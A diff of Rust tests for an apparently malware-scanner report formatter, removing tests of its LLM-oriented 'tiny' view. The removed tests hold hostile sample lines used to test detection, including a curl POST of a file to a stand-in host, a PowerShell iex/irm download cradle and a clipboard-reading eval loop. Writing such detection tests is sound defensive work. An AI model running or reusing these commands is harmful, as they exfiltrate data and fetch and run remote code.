@@ -122,7 +122,7 @@ fn pe_identity_shows_the_version_resource_beside_the_signature() {
         "trust": "ca_signed",
         "build_path": {"value": "C:\\Users\\dev\\proj\\src\\main.rs", "source": "strings"},
     }));
-    let headline = identity_headline(&id, false).expect("headline");
+    let headline = strip_ansi(&identity_headline(&id).expect("headline"));
     let lines = identity_lines(&id);
 
     // The headline names the signer; the claims line names what the binary
@@ -170,7 +170,7 @@ fn macho_identity_keeps_team_and_bundle_version() {
         },
         "trust": "developer_id",
     }));
-    let headline = identity_headline(&id, false).expect("headline");
+    let headline = strip_ansi(&identity_headline(&id).expect("headline"));
     let lines = identity_lines(&id);
     assert!(headline.contains("com.contoso.helper"), "{headline}");
     assert!(headline.contains("developer-id"), "{headline}");
@@ -198,7 +198,7 @@ fn docx_identity_keeps_company_beside_author_and_producer() {
         "producer": {"value": "Microsoft Office Word", "source": "docprops.app.application"},
         "trust": "unsigned",
     }));
-    let headline = identity_headline(&id, false).expect("headline");
+    let headline = strip_ansi(&identity_headline(&id).expect("headline"));
     let lines = identity_lines(&id);
     assert!(headline.contains("Q3 Vendor Invoice"), "{headline}");
     assert!(headline.contains("Aleksandr Petrov"), "{headline}");
@@ -224,7 +224,7 @@ fn a_signed_artifact_still_names_its_producing_tool() {
         "signer": {"common_name": "Contoso Ltd", "source": "ooxml.signature"},
         "trust": "ca_signed",
     }));
-    let headline = identity_headline(&id, false).expect("headline");
+    let headline = strip_ansi(&identity_headline(&id).expect("headline"));
     assert!(headline.contains("ca-signed"), "{headline}");
     assert!(!headline.contains("LibreOffice"), "{headline}");
     assert!(
@@ -234,39 +234,9 @@ fn a_signed_artifact_still_names_its_producing_tool() {
     );
 }
 
-/// The whole point is that this reaches the LLM view, which has no rich
-/// header — only the minimal header plus these lines.
-#[test]
-fn tiny_view_carries_the_full_identity_block() {
-    let mut file = src_file(
-        0,
-        "setup.exe",
-        5,
-        vec![finding_with("t/one", Criticality::Notable)],
-        vec![ctx_line(
-            1,
-            "MZ",
-            Some(ctx_note("t/one", Criticality::Notable, 1)),
-        )],
-    );
-    file.file_type = "pe".to_string();
-    file.identity = Some(identity(serde_json::json!({
-        "name": {"value": "setup.exe", "source": "pe.version.original_filename"},
-        "project": {"value": "Contoso Updater", "source": "pe.version.product_name"},
-        "organization": {"value": "Contoso Ltd", "source": "pe.version.company_name"},
-        "signer": {"organization": "Vanguard Tech Limited", "source": "pe.signatures[0]"},
-        "trust": "ca_signed",
-    })));
-    let tiny = format_context(&report_with_files(vec![file]), &TinyOpts::tiny());
-    assert!(tiny.contains("Vanguard Tech Limited"), "{tiny}");
-    assert!(tiny.contains(r#"product="Contoso Updater""#), "{tiny}");
-    assert!(tiny.contains(r#"company="Contoso Ltd""#), "{tiny}");
-}
-
 /// The terminal view keeps the header to what a human scans: no severity
 /// tally, no `claims`/`ids` identity lines, and no file-level observation
-/// without a location unless it is suspicious or worse. The tiny view keeps
-/// the identity lines for a file it renders, but draws no location-less note.
+/// without a location unless it is suspicious or worse.
 #[test]
 fn terminal_view_trims_counts_claims_ids_and_locationless_notables() {
     let mut file = src_file(
@@ -301,13 +271,6 @@ fn terminal_view_trims_counts_claims_ids_and_locationless_notables() {
     assert!(!terminal.contains("1N"), "{terminal}");
     assert!(!terminal.contains("t/notable-note"), "{terminal}");
     assert!(terminal.contains("t/suspicious-note"), "{terminal}");
-
-    let tiny = format_context(&report, &TinyOpts::tiny());
-    assert!(tiny.contains("claims"), "{tiny}");
-    assert!(tiny.contains("cdhash"), "{tiny}");
-    assert!(tiny.contains("t/windowed"), "{tiny}");
-    assert!(!tiny.contains("t/notable-note"), "{tiny}");
-    assert!(!tiny.contains("t/suspicious-note"), "{tiny}");
 }
 
 #[test]
@@ -328,89 +291,6 @@ fn embedded_label_formats_kind_offset_and_size() {
     );
     // Ordinary paths are not embedded markers.
     assert_eq!(embedded_label("alvr/deps", 100), None);
-}
-
-/// The machine view collapses a finding repeated across a sample's own
-/// members — the same "no symbol table" across a hundred of them is noise.
-/// A fetched dependency is not one of those members: it is a separate
-/// artifact with its own author, and its firing the same finding is a second
-/// independent occurrence. Because the root renders first, the copy that got
-/// dropped was the dependency's — silently deleting a hostile finding from
-/// the block of the artifact that actually carried it.
-#[test]
-fn dedup_does_not_cross_a_fetched_artifact_boundary() {
-    let shared = "objectives/exec/install-hook";
-    let mut root = src_file(
-        0,
-        "wrapper.tgz",
-        5,
-        vec![finding_with(shared, Criticality::Suspicious)],
-        vec![],
-    );
-    root.depth = 0;
-
-    // An ordinary member of the sample: its repeat is noise, still collapsed.
-    let mut member = src_file(
-        1,
-        "wrapper.tgz!!lib/a.js",
-        4,
-        vec![finding_with(shared, Criticality::Suspicious)],
-        vec![ctx_line(
-            1,
-            "install()",
-            Some(ctx_note(shared, Criticality::Suspicious, 1)),
-        )],
-    );
-    member.depth = 1;
-    member.parent_id = Some(0);
-
-    // A fetched dependency, and one of its own members.
-    let mut dep = src_file(
-        2,
-        "pkg:npm/evil@1.0.0",
-        4,
-        vec![finding_with(shared, Criticality::Hostile)],
-        vec![],
-    );
-    dep.depth = 1;
-    dep.parent_id = Some(0);
-    dep.rel = crate::types::Rel::Fetched;
-    let mut dep_member = src_file(
-        3,
-        "pkg:npm/evil@1.0.0!!index.js",
-        3,
-        vec![finding_with(shared, Criticality::Hostile)],
-        vec![ctx_line(
-            1,
-            "install()",
-            Some(ctx_note(shared, Criticality::Hostile, 1)),
-        )],
-    );
-    dep_member.depth = 2;
-    dep_member.parent_id = Some(2);
-
-    let report = report_with_files(vec![root, member, dep, dep_member]);
-    let tiny = format_context(&report, &TinyOpts::tiny());
-
-    // Containers collapse their findings into the member that carries them,
-    // so the two blocks that render are the sample's member and the
-    // dependency's. The criticality marker tells them apart: S is the
-    // sample's copy, H the dependency's. Deduped across the boundary, the
-    // sample renders first and H disappears entirely.
-    assert!(
-        tiny.contains("# H "),
-        "the dependency's own finding was deduped away against the sample's: {tiny:?}",
-    );
-    assert_eq!(
-        tiny.matches("# H ").count(),
-        1,
-        "dedup still collapses repeats inside the dependency: {tiny:?}",
-    );
-    assert_eq!(
-        tiny.matches("# S ").count(),
-        1,
-        "dedup still collapses repeats inside the sample: {tiny:?}",
-    );
 }
 
 fn finding_with(id: &str, crit: Criticality) -> Finding {
@@ -439,7 +319,7 @@ fn file_with_findings(findings: Vec<Finding>) -> FileAnalysis {
 }
 
 /// A source (`python`) file with an explicit score, findings, and pre-built
-/// context — the inputs the tiny context view ranks and renders from.
+/// context — the inputs the context view ranks and renders from.
 fn src_file(
     id: u32,
     path: &str,
@@ -538,8 +418,8 @@ fn ctx_note(id: &str, crit: Criticality, loc: u64) -> crate::types::Note {
     }
 }
 
-/// An empty finalized report with `files` swapped in — the tiny view reads
-/// `report.files` directly, so this drives `format_tiny` from raw files.
+/// An empty finalized report with `files` swapped in — the context view reads
+/// `report.files` directly, so this drives `format_context` from raw files.
 fn report_with_files(files: Vec<FileAnalysis>) -> AnalysisReport {
     let mut report = create_test_report(vec![], vec![]);
     report.files = files;
@@ -547,7 +427,7 @@ fn report_with_files(files: Vec<FileAnalysis>) -> AnalysisReport {
 }
 
 /// A binary (`elf`) file with a score, findings, and pre-built byte context —
-/// what the tiny binary (ASCII-forward) view renders from.
+/// what the hex view renders from.
 fn bin_file(id: u32, score: u32, findings: Vec<Finding>, context: Vec<Win>) -> FileAnalysis {
     let mut fa = FileAnalysis::new(
         id,
@@ -1006,7 +886,7 @@ fn select_ids_always_shows_suspicious_and_hostile_past_cap() {
         .map(|i| finding_with(&format!("hostile-{i}"), Criticality::Hostile))
         .collect();
     let file = file_with_findings(findings);
-    let selected = select_ids(&file, &TinyOpts::terminal(), 0);
+    let selected = select_ids(&file, &TinyOpts::terminal());
     assert_eq!(
         selected.len(),
         60,
@@ -1028,7 +908,7 @@ fn select_ids_caps_lower_crit_remainder_but_keeps_high() {
         findings.push(finding_with(&format!("hostile-{i}"), Criticality::Hostile));
     }
     let file = file_with_findings(findings);
-    let selected = select_ids(&file, &TinyOpts::terminal(), 0);
+    let selected = select_ids(&file, &TinyOpts::terminal());
     assert_eq!(selected.len(), 40, "total capped at 40");
     for i in 0..5 {
         assert!(selected.contains(&format!("sus-{i}").as_str()));
@@ -1047,56 +927,19 @@ fn select_ids_caps_lower_crit_remainder_but_keeps_high() {
 }
 
 #[test]
-fn tiny_view_widens_cap_to_250() {
-    // 300 notable findings: the terminal cap (40) truncates hard, but the
-    // tiny/LLM view casts a wider net — top 250 — so the model sees far more
-    // of the picture before the cap bites.
+fn terminal_view_caps_notables_at_40() {
+    // 300 notable findings: the terminal cap (40) truncates hard.
     let findings = (0..300)
         .map(|i| finding_with(&format!("notable-{i}"), Criticality::Notable))
         .collect();
     let file = file_with_findings(findings);
-    assert_eq!(select_ids(&file, &TinyOpts::terminal(), 0).len(), 40);
-    assert_eq!(select_ids(&file, &TinyOpts::tiny(), 0).len(), 250);
+    assert_eq!(select_ids(&file, &TinyOpts::terminal()).len(), 40);
 }
 
 #[test]
-fn low_tier_fill_tops_up_to_budget_without_evicting() {
-    // 5 notable + 20 low-tier with a fill of 15: all 5 notable stay, the 10
-    // best low-tier top the selection up to exactly 15.
-    let mut findings: Vec<Finding> = (0..5)
-        .map(|i| finding_with(&format!("notable-{i}"), Criticality::Notable))
-        .collect();
-    for i in 0..10 {
-        findings.push(finding_with(&format!("comp-{i}"), Criticality::Component));
-    }
-    for i in 0..10 {
-        findings.push(finding_with(&format!("base-{i}"), Criticality::Baseline));
-    }
-    let file = file_with_findings(findings);
-    let selected = select_ids(&file, &TinyOpts::tiny(), 15);
-    assert_eq!(selected.len(), 15, "fill tops up to the budget");
-    for i in 0..5 {
-        assert!(selected.contains(&format!("notable-{i}").as_str()));
-    }
-    // Baseline outranks Component (crit 2 vs 1), so at equal confidence the
-    // 10 baselines win the fill slots.
-    for i in 0..10 {
-        assert!(selected.contains(&format!("base-{i}").as_str()));
-    }
-
-    // A file already at/over the budget with real signal takes no fill.
-    let findings = (0..20)
-        .map(|i| finding_with(&format!("notable-{i}"), Criticality::Notable))
-        .collect();
-    let file = file_with_findings(findings);
-    assert_eq!(select_ids(&file, &TinyOpts::tiny(), 15).len(), 20);
-}
-
-#[test]
-fn undetected_file_renders_low_tier_in_tiny_but_not_terminal() {
-    // A benign file with only low-tier traits: the LLM/tiny view must show
-    // its top traits (an empty payload tells a downstream grader nothing),
-    // while the human terminal view stays quiet as before.
+fn undetected_file_stays_quiet_in_terminal() {
+    // A benign file with only low-tier traits: the human terminal view stays
+    // quiet.
     let comp = finding_with("micro/fs::readdir", Criticality::Component);
     let base = finding_with("meta/build::debuglink", Criticality::Baseline);
     let file = src_file(
@@ -1119,871 +962,11 @@ fn undetected_file_renders_low_tier_in_tiny_but_not_terminal() {
     );
     let report = report_with_files(vec![file]);
 
-    let tiny = format_context(&report, &TinyOpts::tiny());
-    assert!(
-        tiny.contains("readdir(dirp);"),
-        "tiny view surfaces low-tier context, got: {tiny:?}"
-    );
-    assert!(
-        tiny.contains("debuglink(section);"),
-        "baseline context surfaces too, got: {tiny:?}"
-    );
-
     let terminal = format_context(&report, &TinyOpts::terminal());
     assert!(
         terminal.is_empty(),
         "terminal view stays quiet for an undetected file, got: {terminal:?}"
     );
-}
-
-#[test]
-fn tiny_caps_context_to_top_five_scoring_files() {
-    // Six source files, descending score. The top five draw their source
-    // context (the hit line's code shows); the sixth is past the cap, so it
-    // renders nothing at all: an annotation without its code is noise.
-    let files: Vec<FileAnalysis> = (0..6)
-        .map(|i| {
-            let id = format!("cat/trait::n{i}");
-            let note = ctx_note(&id, Criticality::Notable, 1);
-            src_file(
-                i,
-                &format!("/f{i}.py"),
-                100 - i, // strictly descending: f0 highest, f5 lowest
-                vec![Finding {
-                    desc: format!("finding desc {i}").into(),
-                    ..finding_with(&id, Criticality::Notable)
-                }],
-                vec![ctx_line(
-                    1,
-                    &format!("CODELINE_{i} = real_work()"),
-                    Some(note),
-                )],
-            )
-        })
-        .collect();
-    let output = format_tiny(&report_with_files(files));
-
-    // Top five render their code...
-    for i in 0..5 {
-        assert!(
-            output.contains(&format!("CODELINE_{i}")),
-            "file {i} (top-5) should show context\n{output}"
-        );
-    }
-    // ...the sixth renders neither its code nor a bare note, nor a header.
-    assert!(
-        !output.contains("CODELINE_5"),
-        "file 5 is past the context cap; no window\n{output}"
-    );
-    assert!(
-        !output.contains("finding desc 5") && !output.contains("f5.py"),
-        "file 5 is past the cap and must not render\n{output}"
-    );
-}
-
-/// A file with no captured window cannot show code, so it never takes one of
-/// the five slots; a file carrying a suspicious composite's evidence outranks
-/// a higher-scored file that carries none.
-#[test]
-fn tiny_context_slots_go_to_windowed_files_evidence_first() {
-    let windowed = |i: u32, score: u32| {
-        let id = format!("cat/trait::n{i}");
-        let note = ctx_note(&id, Criticality::Notable, 1);
-        src_file(
-            i,
-            &format!("/f{i}.py"),
-            score,
-            vec![finding_with(&id, Criticality::Notable)],
-            vec![ctx_line(
-                1,
-                &format!("CODELINE_{i} = real_work()"),
-                Some(note),
-            )],
-        )
-    };
-    // Top score, but nothing to draw.
-    let bare = src_file(
-        0,
-        "/bare.py",
-        1000,
-        vec![Finding {
-            desc: "bare finding".into(),
-            ..finding_with("cat/trait::bare", Criticality::Notable)
-        }],
-        vec![],
-    );
-    let mut files: Vec<FileAnalysis> = vec![bare];
-    files.extend((1..6).map(|i| windowed(i, 100 - i)));
-    // Lowest score, but it holds a suspicious composite's leg.
-    let leg = "cat/trait::leg";
-    let mut composite = finding_with("objectives/exec::chain", Criticality::Suspicious);
-    composite.trait_refs = vec![leg.to_string().into()];
-    let note = ctx_note(leg, Criticality::Notable, 1);
-    files.push(src_file(
-        6,
-        "/legs.py",
-        1,
-        vec![composite, finding_with(leg, Criticality::Notable)],
-        vec![ctx_line(1, "LEGLINE = run()", Some(note))],
-    ));
-    let output = format_tiny(&report_with_files(files));
-
-    assert!(!output.contains("bare"), "{output}");
-    assert!(output.contains("LEGLINE"), "{output}");
-    for i in 1..5 {
-        assert!(output.contains(&format!("CODELINE_{i}")), "{output}");
-    }
-    assert!(!output.contains("CODELINE_5"), "{output}");
-}
-
-/// Capture keeps only the strongest note on an overlapping span, so a
-/// hostile composite anchored on its leg's evidence displaces the leg's own
-/// note. The tiny view then withholds the composite — and with it the only
-/// located evidence: the leg rendered as a bare note and the matched line
-/// never appeared. The composite's note now stands in for the omitted leg.
-#[test]
-fn tiny_hands_a_withheld_composite_note_to_its_leg() {
-    let leg = "micro/http/upload::curl-post-file";
-    let mut composite = finding_with("objectives/exfil::skill-posts-file", Criticality::Hostile);
-    composite.trait_refs = vec![leg.to_string().into()];
-    let leg_finding = Finding {
-        evidence: vec![Evidence::new("string", "", "curl").with_offset(12 * LINE_BYTES)],
-        ..finding_with(leg, Criticality::Notable)
-    };
-    let file = src_file(
-        0,
-        "SKILL.md",
-        50,
-        vec![leg_finding, composite],
-        vec![ctx_line(
-            12,
-            "curl -X POST https://h.example/a --data-binary @a\n",
-            Some(ctx_note(
-                "objectives/exfil::skill-posts-file",
-                Criticality::Hostile,
-                12,
-            )),
-        )],
-    );
-    let tiny = format_context(&report_with_files(vec![file]), &TinyOpts::tiny());
-    assert!(
-        tiny.contains("--data-binary @a"),
-        "the leg's matched line must render: {tiny}"
-    );
-    assert!(
-        tiny.contains("# N 12:1 micro/http/upload::curl-post-file"),
-        "the window is annotated with the leg, not the composite: {tiny}"
-    );
-    assert!(
-        !tiny.contains("skill-posts-file"),
-        "the composite stays withheld: {tiny}"
-    );
-}
-
-/// The opt-in roster names a composite the tiny preset withholds.
-#[test]
-fn elevated_roster_lists_a_withheld_composite_when_enabled() {
-    let leg = "micro/http/upload::curl-post-file";
-    let comp = "objectives/exfil::skill-posts-file";
-    let composite = Finding {
-        trait_refs: vec![leg.to_string().into()],
-        ..finding_with(comp, Criticality::Hostile)
-    };
-    let leg_finding = Finding {
-        evidence: vec![Evidence::new("string", "", "curl").with_offset(12 * LINE_BYTES)],
-        ..finding_with(leg, Criticality::Notable)
-    };
-    let file = src_file(
-        0,
-        "SKILL.md",
-        50,
-        vec![leg_finding, composite],
-        vec![ctx_line(
-            12,
-            "curl -X POST https://h.example/a --data-binary @a\n",
-            Some(ctx_note(leg, Criticality::Notable, 12)),
-        )],
-    );
-    let report = report_with_files(vec![file]);
-    assert!(!format_tiny(&report).contains(comp), "off by default");
-    let opts = TinyOpts {
-        elevated_roster: true,
-        ..TinyOpts::tiny()
-    };
-    let tiny = format_context(&report, &opts);
-    assert!(
-        tiny.contains(&format!("# H {comp}")),
-        "the hostile composite must be listed: {tiny}"
-    );
-    assert!(
-        tiny.contains(&format!("# N 12:1 {leg}")),
-        "its leg still annotates the evidence line: {tiny}"
-    );
-}
-
-/// Two elevated findings on one source line each get their annotation;
-/// keeping only the strongest note per row hid the other.
-#[test]
-fn tiny_announces_every_elevated_note_on_a_shared_line() {
-    let a = "objectives/exec::decode-exec";
-    let b = "objectives/evasion::debugger-abort";
-    let mut line = ctx_line(1, "exec(d(p)) if not trace() else exit()\n", None);
-    line.notes = vec![
-        ctx_note(a, Criticality::Hostile, line.line.loc),
-        ctx_note(b, Criticality::Suspicious, line.line.loc + 18), // `trace`
-    ];
-    let file = src_file(
-        0,
-        "x.py",
-        50,
-        vec![
-            finding_with(a, Criticality::Hostile),
-            finding_with(b, Criticality::Suspicious),
-        ],
-        vec![line],
-    );
-    let tiny = format_tiny(&report_with_files(vec![file]));
-    assert!(tiny.contains(&format!("# H 1:1 {a}")), "{tiny}");
-    assert!(tiny.contains(&format!("# S 1:19 {b}")), "{tiny}");
-    assert_eq!(
-        tiny.matches(&format!("({b})")).count(),
-        1,
-        "shown once, not rostered again: {tiny}"
-    );
-}
-
-/// A hostile composite over component legs that share a line with a
-/// stronger note: both legs are announced on that line, and nothing names
-/// the composite.
-#[test]
-fn tiny_shows_component_legs_of_a_withheld_composite() {
-    let strong = "micro/exec::eval-call";
-    let (a, b) = ("micro/io::read-clipboard", "micro/time::set-interval");
-    let comp = "objectives/steal::clipboard-poll-exfil";
-    let composite = Finding {
-        trait_refs: vec![a.to_string().into(), b.to_string().into()],
-        ..finding_with(comp, Criticality::Hostile)
-    };
-    let mut line = ctx_line(
-        3,
-        "setInterval(()=>eval(navigator.clipboard.readText()))\n",
-        None,
-    );
-    line.notes = vec![
-        ctx_note(strong, Criticality::Notable, line.line.loc + 16), // `eval`
-        ctx_note(a, Criticality::Component, line.line.loc + 41),    // `readText`
-        ctx_note(b, Criticality::Component, line.line.loc),
-    ];
-    let file = src_file(
-        0,
-        "bg.js",
-        50,
-        vec![
-            finding_with(strong, Criticality::Notable),
-            finding_with(a, Criticality::Component),
-            finding_with(b, Criticality::Component),
-            composite,
-        ],
-        vec![line],
-    );
-    let tiny = format_tiny(&report_with_files(vec![file]));
-    assert!(tiny.contains(&format!("# N 3:17 {strong}")), "{tiny}");
-    assert!(tiny.contains(&format!("# C 3:42 {a}")), "{tiny}");
-    assert!(tiny.contains(&format!("# C 3:1 {b}")), "{tiny}");
-    assert!(!tiny.contains(comp) && !tiny.contains("# H"), "{tiny}");
-}
-
-/// Legs resolve through a nested composite to its atoms; neither
-/// composite's id reaches the render.
-#[test]
-fn tiny_resolves_nested_composites_to_their_atoms() {
-    let top = "objectives/exfil::wallet-exfil";
-    let mid = "micro/ui::credential-surface";
-    let (label, post) = ("micro/ui::mnemonic-label", "micro/http::post");
-    let file = src_file(
-        0,
-        "x.js",
-        50,
-        vec![
-            Finding {
-                trait_refs: vec![mid.to_string().into(), post.to_string().into()],
-                ..finding_with(top, Criticality::Hostile)
-            },
-            Finding {
-                trait_refs: vec![label.to_string().into()],
-                ..finding_with(mid, Criticality::Notable)
-            },
-            finding_with(label, Criticality::Component),
-            finding_with(post, Criticality::Baseline),
-        ],
-        vec![
-            ctx_line(
-                1,
-                "showMnemonic()",
-                Some(ctx_note(label, Criticality::Component, 1)),
-            ),
-            ctx_line(
-                3,
-                "post(url)",
-                Some(ctx_note(post, Criticality::Baseline, 3)),
-            ),
-        ],
-    );
-    let tiny = format_tiny(&report_with_files(vec![file]));
-    assert!(tiny.contains(&format!("({label})")), "{tiny}");
-    assert!(tiny.contains(&format!("({post})")), "{tiny}");
-    assert!(!tiny.contains(top) && !tiny.contains(mid), "{tiny}");
-}
-
-/// An archive-scope composite pools legs from two members: each leg
-/// renders in the member it matched in, not on the container.
-#[test]
-fn tiny_places_cross_member_legs_in_their_members() {
-    let comp = "objectives/exfil::form-to-http";
-    let (form, send) = ("micro/ui::form-input", "micro/http::fetch-post");
-    let mut root = src_file(
-        0,
-        "/s/ext.zip",
-        90,
-        vec![
-            Finding {
-                trait_refs: vec![form.to_string().into(), send.to_string().into()],
-                ..finding_with(comp, Criticality::Hostile)
-            },
-            // The container's inherited copies of its members' legs.
-            Finding {
-                src: Some(1),
-                ..finding_with(form, Criticality::Component)
-            },
-            Finding {
-                src: Some(2),
-                ..finding_with(send, Criticality::Component)
-            },
-        ],
-        vec![],
-    );
-    root.file_type = "zip".to_string();
-    root.composite_sources.insert(
-        comp.to_string(),
-        vec![
-            crate::types::file_analysis::CompositeSource {
-                file: 1,
-                line: None,
-                offset: None,
-            },
-            crate::types::file_analysis::CompositeSource {
-                file: 2,
-                line: None,
-                offset: None,
-            },
-        ],
-    );
-    let member = |id: u32, name: &str, leg: &str| {
-        let mut m = src_file(
-            id,
-            &format!("/s/ext.zip!!{name}"),
-            10,
-            vec![finding_with(leg, Criticality::Component)],
-            vec![ctx_line(
-                1,
-                "handle(input)",
-                Some(ctx_note(leg, Criticality::Component, 1)),
-            )],
-        );
-        m.depth = 1;
-        m.parent_id = Some(0);
-        m
-    };
-    let files = vec![root, member(1, "login.js", form), member(2, "app.js", send)];
-    let tiny = format_tiny(&report_with_files(files));
-    // A member's block: from its header to the next file header.
-    let block = |name: &str| {
-        let rest = tiny
-            .find(&format!("ext.zip/{name}\t"))
-            .map_or("", |start| &tiny[start..]);
-        let end = rest
-            .get(1..)
-            .and_then(|r| r.find("ext.zip/"))
-            .map_or(rest.len(), |i| i + 1);
-        rest[..end].to_string()
-    };
-    assert!(block("login.js").contains(&format!("({form})")), "{tiny}");
-    assert!(block("app.js").contains(&format!("({send})")), "{tiny}");
-    assert!(!tiny.contains(comp), "{tiny}");
-}
-
-#[test]
-fn mentions_id_matches_whole_ids_only() {
-    assert!(mentions_id("desc (a/b::c)\n", "a/b::c"));
-    assert!(mentions_id("# S a/b::c\n", "a/b::c"));
-    assert!(!mentions_id("desc (a/b::c-d)", "a/b::c"));
-    assert!(!mentions_id("desc (x/a/b::c)", "a/b::c"));
-}
-
-/// A composite's note covers the one leg it was anchored on. Its other
-/// legs match elsewhere, so handing them the note would label a line with
-/// a trait that is not its evidence (a paste-site leg once annotated a
-/// tunnel URL line). With no window of their own they have no code to sit
-/// beside, so the LLM view does not list them at all.
-#[test]
-fn tiny_relabel_hands_a_composite_note_only_to_legs_it_covers() {
-    let a = "micro/tunnel::quick-service";
-    let b = "micro/paste::shz-al";
-    let comp = "objectives/c2::tunnel-address-paste-rendezvous";
-    let leg = |id: &str, off: u64, value: &str| Finding {
-        evidence: vec![Evidence::new("string", "", value).with_offset(off)],
-        ..finding_with(id, Criticality::Notable)
-    };
-    let composite = Finding {
-        trait_refs: vec![a.to_string().into(), b.to_string().into()],
-        ..finding_with(comp, Criticality::Suspicious)
-    };
-    let file = src_file(
-        0,
-        "agent.py",
-        50,
-        vec![
-            leg(a, 12 * LINE_BYTES, "trycloudflare"),
-            leg(b, 900, "shz.al"),
-            composite,
-        ],
-        vec![ctx_line(
-            12,
-            "QUICK_SERVICE = 'https://api.trycloudflare.com'\n",
-            Some(ctx_note(comp, Criticality::Suspicious, 12)),
-        )],
-    );
-    let tiny = format_context(&report_with_files(vec![file]), &TinyOpts::tiny());
-    assert!(
-        tiny.contains(&format!("# N 12:1 {a}")),
-        "the covered leg takes the note: {tiny}"
-    );
-    assert!(
-        !tiny.contains(&format!("12:1 {b}")),
-        "the uncovered leg is not labeled onto the anchor line: {tiny}"
-    );
-    assert!(
-        !tiny.contains(b),
-        "an uncovered leg with no window renders no bare note: {tiny}"
-    );
-    assert!(
-        !tiny.contains("rendezvous"),
-        "the composite stays withheld: {tiny}"
-    );
-}
-
-/// Each leg of a withheld composite labels the line at its own column:
-/// notes come from the final findings, so a leg with its own span is never
-/// left unnamed under the composite's note.
-#[test]
-fn tiny_labels_each_leg_of_a_withheld_composite_at_its_own_column() {
-    let a = "micro/ps::iex";
-    let b = "micro/ps::irm-alias";
-    let comp = "objectives/exec::download-cradle";
-    let leg = |id: &str, off: u64, value: &str| Finding {
-        evidence: vec![Evidence::new("string", "", value).with_offset(off)],
-        ..finding_with(id, Criticality::Notable)
-    };
-    let composite = Finding {
-        trait_refs: vec![a.to_string().into(), b.to_string().into()],
-        ..finding_with(comp, Criticality::Suspicious)
-    };
-    // One drawn line holds both legs; the composite's note covers only A.
-    let file = src_file(
-        0,
-        "sample.ps1",
-        50,
-        vec![leg(a, 0, "iex"), leg(b, 5, "irm"), composite],
-        vec![ctx_line(
-            0,
-            "iex (irm https://h.example/p)\n",
-            Some(ctx_note(comp, Criticality::Suspicious, 0)),
-        )],
-    );
-    let tiny = format_context(&report_with_files(vec![file]), &TinyOpts::tiny());
-    assert!(
-        tiny.contains("irm https://h.example/p"),
-        "line drawn: {tiny}"
-    );
-    assert!(
-        tiny.contains(&format!("0:1 {a}")),
-        "A labels the line: {tiny}"
-    );
-    assert!(
-        tiny.contains(&format!("0:6 {b}")),
-        "B labels its own column: {tiny}"
-    );
-    assert!(!tiny.contains(comp), "{tiny}");
-}
-
-/// A window the per-file cap declines to draw takes its annotation with it:
-/// the LLM view draws no annotation without its code.
-#[test]
-fn tiny_window_cap_drops_capped_annotations() {
-    let ctx = |i: u64, id: &str| {
-        ctx_line(
-            i * 100,
-            "payload_line_with_enough_code(x)\n",
-            Some(ctx_note(id, Criticality::Notable, i * 100)),
-        )
-    };
-    let mut file = src_file(
-        0,
-        "a.py",
-        50,
-        vec![
-            finding_with("t/one", Criticality::Notable),
-            finding_with("t/two", Criticality::Notable),
-            finding_with("t/three", Criticality::Notable),
-        ],
-        vec![ctx(1, "t/one"), ctx(2, "t/two"), ctx(3, "t/three")],
-    );
-    for (f, c) in file.findings.iter_mut().zip([0.9, 0.8, 0.7]) {
-        f.conf = c;
-    }
-    let opts = TinyOpts {
-        max_windows: 1,
-        ..TinyOpts::tiny()
-    };
-    let tiny = format_context(&report_with_files(vec![file]), &opts);
-    assert_eq!(
-        tiny.matches("payload_line_with_enough_code").count(),
-        1,
-        "one window drawn: {tiny}"
-    );
-    assert!(
-        tiny.contains("t/one"),
-        "the strongest window is drawn: {tiny}"
-    );
-    for id in ["t/two", "t/three"] {
-        assert!(!tiny.contains(id), "{id} has no window, so no note: {tiny}");
-    }
-}
-
-/// The byte budget keeps the strongest windows that fit and drops the rest,
-/// annotations included; a weaker window that still fits is not skipped.
-#[test]
-fn tiny_window_byte_budget_keeps_strongest_that_fit() {
-    let big = "x".repeat(300);
-    let mk = |i: u64, id: &str, data: &str, conf: f32| {
-        let mut l = ctx_line(
-            i * 1000,
-            data,
-            Some(ctx_note(id, Criticality::Notable, i * 1000)),
-        );
-        l.notes[0].conf = conf;
-        l
-    };
-    let mut file = src_file(
-        0,
-        "a.py",
-        50,
-        vec![
-            finding_with("t/strong", Criticality::Notable),
-            finding_with("t/mid", Criticality::Notable),
-            finding_with("t/weak", Criticality::Notable),
-        ],
-        vec![
-            mk(1, "t/strong", &format!("strong_call({big})\n"), 0.9),
-            mk(2, "t/mid", &format!("mid_call({big})\n"), 0.8),
-            mk(3, "t/weak", "weak_call(short_enough)\n", 0.7),
-        ],
-    );
-    for (f, c) in file.findings.iter_mut().zip([0.9, 0.8, 0.7]) {
-        f.conf = c;
-    }
-    let opts = TinyOpts {
-        window_bytes: 400,
-        ..TinyOpts::tiny()
-    };
-    let tiny = format_context(&report_with_files(vec![file]), &opts);
-    assert!(
-        tiny.contains("strong_call("),
-        "strongest window drawn: {tiny}"
-    );
-    assert!(
-        !tiny.contains("mid_call("),
-        "second 300-byte window overspends: {tiny}"
-    );
-    assert!(
-        tiny.contains("weak_call("),
-        "a weaker window that fits is drawn: {tiny}"
-    );
-    assert!(
-        !tiny.contains("t/mid"),
-        "the budgeted-out finding renders no bare note: {tiny}"
-    );
-}
-
-/// A located note for `id` at line `line` with confidence `conf`.
-fn story_line(line: u64, data: &str, id: &str, crit: Criticality, conf: f32) -> Win {
-    let mut note = ctx_note(id, crit, line);
-    note.conf = conf;
-    ctx_line(line, data, Some(note))
-}
-
-/// Findings for every note in `context`, at the note's criticality and
-/// confidence, followed by `extra`.
-fn story_file(context: Vec<Win>, extra: Vec<Finding>) -> FileAnalysis {
-    let mut findings: Vec<Finding> = context
-        .iter()
-        .flat_map(|l| &l.notes)
-        .map(|n| Finding {
-            conf: n.conf,
-            ..finding_with(n.id.as_str(), n.crit)
-        })
-        .collect();
-    findings.extend(extra);
-    src_file(0, "agent.py", 50, findings, context)
-}
-
-fn capped(max_windows: usize) -> TinyOpts {
-    TinyOpts {
-        max_windows,
-        ..TinyOpts::tiny()
-    }
-}
-
-/// Criticality wins: one suspicious window beats notable windows however
-/// confident, compact or diverse they are.
-#[test]
-fn tiny_window_pick_prefers_criticality_over_everything_else() {
-    let mut context = vec![story_line(
-        900,
-        &format!("suspicious_call({})\n", "x".repeat(200)),
-        "objectives/evasion/history::off",
-        Criticality::Suspicious,
-        0.5,
-    )];
-    for (i, fam) in ["net/http", "fs/write", "process/create", "crypto/aes"]
-        .iter()
-        .enumerate()
-    {
-        context.push(story_line(
-            i as u64 + 1,
